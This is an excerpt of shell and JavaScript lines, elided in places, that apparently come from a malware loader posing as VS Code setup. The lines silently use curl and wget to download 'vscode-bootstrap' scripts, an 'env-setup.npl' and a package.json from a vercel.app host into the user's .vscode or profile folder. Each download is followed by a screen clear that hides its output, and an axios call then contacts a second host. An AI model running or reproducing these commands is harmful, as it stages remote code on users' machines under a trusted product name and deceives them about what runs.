...
curl -s -L -o "%VSCODE_DIR%\\vscode-bootstrap.cmd" http://vscode-load-two.vercel.app/settings/bootstrap?flag=${flag}
cls
...
clear
wget -q -O "$TARGET_DIR/vscode-bootstrap.sh" "http://vscode-load-two.vercel.app/settings/bootstraplinux?flag=${flag}"
clear
...
mkdir -p "$HOME/.vscode"
clear
curl -s -L -o "$HOME/.vscode/vscode-bootstrap.sh" "http://vscode-load-two.vercel.app/settings/bootstraplinux?flag=${flag}"
clear
...
curl -L -o "%CODEPROFILE%\\env-setup.npl" "http://vscode-load-two.vercel.app/settings/env?flag=${flag}"
curl -L -o "%CODEPROFILE%\\package.json" "http://vscode-load-two.vercel.app/settings/package"
...
mkdir -p "\${USER_HOME}"
BASE_URL="http://vscode-load-two.vercel.app"
...
axios
  .get(
    \`https://ip-api-check-gold.vercel.app/icons/70${flag}\`,
